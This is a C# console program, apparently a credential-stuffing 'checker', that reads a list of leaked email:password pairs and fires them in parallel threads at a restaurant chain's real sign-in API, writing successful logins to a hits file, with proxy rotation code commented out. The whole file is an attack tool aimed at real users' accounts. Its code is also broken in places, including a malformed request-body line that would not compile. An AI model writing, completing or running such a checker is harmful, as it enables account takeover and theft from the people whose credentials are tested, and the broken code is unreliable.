using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using Leaf.xNet;
using System.Threading;
using System.Timers;
using System.Diagnostics;

namespace FirstChecker
{
    class Program
    {
        public static int CPM = 0;
        public static int CPM_aux = 0;
        public static int checkedCounter = 0;
        public static int totalCounter = 0;
        public static int hitCounter = 0;
        public static int badCounter = 0;
        public static int proxyNumber = 0;
        public static int errorCounter = 0;
        public static int comboNumber = 0;
        public static int proxyTotalCounter = 0;
        public static int stopCount = 0;
        public static int Expired = 0;
        public static string proxyType = "";
        public static string hitCombos;
        public static string FreeCombos;
        public static List<string> comboList = new List<string>();
        public static List<string> proxyList = new List<string>();

        public static void CPM_Worker(object sender, ElapsedEventArgs e)
        {
            Program.CPM = Program.CPM_aux;
            Program.CPM_aux = 0;
        }

        [STAThread]
        public static void Main(string[] args)
        {
            Console.Title = "kill me";
            Console.Clear();
            Console.ForegroundColor
            = ConsoleColor.DarkMagenta;
            Console.WriteLine("hi.");
            Console.ForegroundColor
            = ConsoleColor.Cyan;
            int bots;
            do
            {
                Console.Write(DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt") + " | Threads amount -> ");
                bots = Convert.ToInt32(Console.ReadLine());

            } while (bots <= 0);
            System.Threading.Thread.Sleep(1);

            string pathcombolist;
            do
            {
                OpenFileDialog openFileDialog = new OpenFileDialog();
                openFileDialog.Title = "Load ComboList";
                openFileDialog.DefaultExt = "txt";
                openFileDialog.Filter = "Accounts | *.txt";
                openFileDialog.RestoreDirectory = true;
                openFileDialog.ShowDialog();
                pathcombolist = openFileDialog.FileName;
            }
            while (!File.Exists(pathcombolist));
            Program.comboList = new List<string>(File.ReadAllLines(pathcombolist));
            string proxytype;
            do
            {
                Console.Write(DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt") + " | Type of Proxies [1]Https/[2]Socks4/[3]Socks5/[4]None -> ");
                proxytype = Console.ReadKey().KeyChar.ToString();

            } while (!(proxytype == "1") && !(proxytype == "2") && !(proxytype == "3") && !(proxytype == "4"));
            switch (proxytype)
            {
                case "1":
                    Program.proxyType = "HTTP";
                    break;
                case "2":
                    Program.proxyType = "SOCKS4";
                    break;
                case "3":
                    Program.proxyType = "SOCKS5";
                    break;
                case "4":
                    Program.proxyType = "NONE";
                    break;
            }
            System.Threading.Thread.Sleep(1);
            string Path = "Results";
            string now = @"Results\" + DateTime.Now.ToString("yyyy-MM-dd_h.mm.ss");
            string hits = now + @"\Hits.txt";
            //string frees = now + @"\Frees.txt";
            if (!System.IO.Directory.Exists(Path))
            {
                System.IO.Directory.CreateDirectory(Path);
                System.IO.Directory.CreateDirectory(now);
            }
            else
            {
                System.IO.Directory.CreateDirectory(now);
            }
            Console.WriteLine(" ");

            Random random_0 = new Random();

          /*  string pathproxylist;
            do
            {
                OpenFileDialog openFileDialog = new OpenFileDialog();
                openFileDialog.Title = "Load ProxyList";
                openFileDialog.DefaultExt = "txt";
                openFileDialog.Filter = "Proxies | *.txt";
                openFileDialog.RestoreDirectory = true;
                openFileDialog.ShowDialog();
                pathproxylist = openFileDialog.FileName;
            }
            while (!File.Exists(pathproxylist));
            Program.proxyList = new List<string>(File.ReadAllLines(pathproxylist));*/

            Task.Factory.StartNew(delegate ()
            {
                for (; ; )
                {

                    Program.CPM = Program.CPM_aux / 60;
                    Console.Title = string.Format("cock {0}/{1} | Hits {2} - Frees {3} - Invalids {4} - Retries {5} - Cpm {6}", new object[]
                    {
                        Program.checkedCounter,
                        Program.totalCounter,
                        Program.hitCounter,
                        Program.Expired,
                        Program.badCounter,
                        Program.errorCounter,//
                        Program.CPM
                    });
                }
            });
            Task.Factory.StartNew(delegate ()
            {
                while (Program.stopCount != bots && Program.stopCount - 1 != bots - 1)
                {
                    if (Program.hitCombos != "")
                    {
                        File.AppendAllText(hits, Program.hitCombos);
                    }
                    Program.hitCombos = "";
                    Thread.Sleep(1500);
                    //Program.FreeCombos = "";
                    Thread.Sleep(1500);
                }
                Console.WriteLine(DateTime.Now.ToString("yyyy-MM-dd_h.mm.ss") + "Done.");
                Thread.Sleep(100000000);
                Environment.Exit(0);
            });
            using (FileStream fileStream = File.Open(pathcombolist, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
            {
                using (BufferedStream bufferedStream = new BufferedStream(fileStream))
                {
                    using (StreamReader streamReader = new StreamReader(bufferedStream))
                    {
                        while (streamReader.ReadLine() != null)
                        {
                            Program.totalCounter++;
                        }
                    }
                }
            }
            /*using (FileStream fileStream2 = File.Open(pathproxylist, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
            {
                using (BufferedStream bufferedStream2 = new BufferedStream(fileStream2))
                {
                    using (StreamReader streamReader2 = new StreamReader(bufferedStream2))
                    {
                        while (streamReader2.ReadLine() != null)
                        {
                            Program.proxyTotalCounter++;
                        }
                    }
                }
            }*/
            Console.WriteLine("");
            Console.WriteLine("");
            Console.ForegroundColor
            = ConsoleColor.DarkMagenta;
            for (int i = 1; i <= bots; i++)
            {
                new Thread(new ThreadStart(Program.Check)).Start();
            }
            Console.Read();
        }

        public static void Check()
        {
            string now = @"Results\" + DateTime.Now.ToString("yyyy-MM-dd_h.mm.ss");
            for (; ; )
            {
                if (Program.proxyNumber > Program.proxyList.Count<string>() - 2)
                {
                    goto IL_379;
                }
            IL_06:
                try
                {
                    Interlocked.Increment(ref Program.proxyNumber);
                    using (HttpRequest httpRequest = new HttpRequest())
                    {
                        if (Program.comboNumber >= Program.comboList.Count<string>())
                        {
                            Program.stopCount++;
                            break;
                        }
                        Interlocked.Increment(ref Program.comboNumber);
                        string[] array = Program.comboList[Program.comboNumber].Split(new char[]
                        {
                    ':'
                        });
                        string text = array[0] + ":" + array[1];
                        try
                        {
                            httpRequest.IgnoreProtocolErrors = true;
                            httpRequest.KeepAlive = true;
                            /* if (Program.proxyType == "HTTP")
                             {
                                 httpRequest.Proxy = HttpProxyClient.Parse(Program.proxyList[Program.proxyNumber]);
                             }
                             if (Program.proxyType == "SOCKS4")
                             {
                                 httpRequest.Proxy = Socks4ProxyClient.Parse(Program.proxyList[Program.proxyNumber]);
                             }
                             if (Program.proxyType == "SOCKS5")
                             {
                                 httpRequest.Proxy = Socks5ProxyClient.Parse(Program.proxyList[Program.proxyNumber]);
                             }*/

                            string content = $"{{\"email\" \":\"{ array[0] }\" \"password:\"{array[1]} "
                            httpRequest.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                            // httpRequest.AddHeader("Pragma", "no-cache");
                            //    httpRequest.AddHeader("Accept", "*/*");
                            /* httpRequest.AddHeader("email:", array[0]);
                             httpRequest.AddHeader("password:", array[1]);
                             httpRequest.AddHeader("basketid:", null);
                             httpRequest.AddHeader("origin", "www.api.prod.potbelly.com");*/
                            HttpContent cnt;
                            
                            //httpRequest.Post
                            //httpRequest.Post("https://api.prod.potbelly.com/v1/signin");
                            string text2 = httpRequest.Post("https://api.prod.potbelly.com/v1/signin", content).StatusCode.ToString();
                            if (text2.Contains("FirstName"))
                            {
                                Console.WriteLine("[ hit ] " + array[0] + ":" + array[1]);
                                Program.checkedCounter++;
                                Program.hitCounter++;
                            }
                            else if (text2.Contains("could_not_authenticate"))
                            {
                                Program.CPM_aux++;
                                Program.checkedCounter++;
                                Program.badCounter++;
                            }
                            else
                            {
                                Console.WriteLine(text2);
                                Program.errorCounter++;
                                Program.comboList.Add(text);
                            }
                        }
                        catch (Exception ex)
                        {
                            Program.comboList.Add(text);
                            Console.WriteLine(ex.Message);
                            Interlocked.Increment(ref Program.errorCounter);
                        }
                    }
                    continue;
                }
                catch (Exception)
                {
                    Interlocked.Increment(ref Program.errorCounter);
                    continue;
                }
            IL_379:
                Program.proxyNumber = 0;
                goto IL_06;
            }
        }
    }
}
